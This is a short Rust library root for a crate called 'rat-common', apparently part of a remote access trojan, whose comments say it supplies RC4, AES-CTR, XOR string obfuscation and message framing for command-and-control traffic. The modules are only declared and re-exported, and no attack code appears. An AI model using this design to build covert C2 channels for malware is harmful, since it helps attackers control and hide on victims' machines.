//! rat-common — Shared crypto, protocol, and obfuscation primitives
//!
//! Provides RC4, AES-CTR hybrid encryption, XOR string obfuscation,
//! and length-prefixed framing for C2 communications.

pub mod crypto;
pub mod obfuscation;
pub mod protocol;

pub use crypto::{HybridCipher, Rc4};
pub use obfuscation::{xor_decrypt, xor_encrypt};
pub use protocol::{FramedReader, FramedWriter};
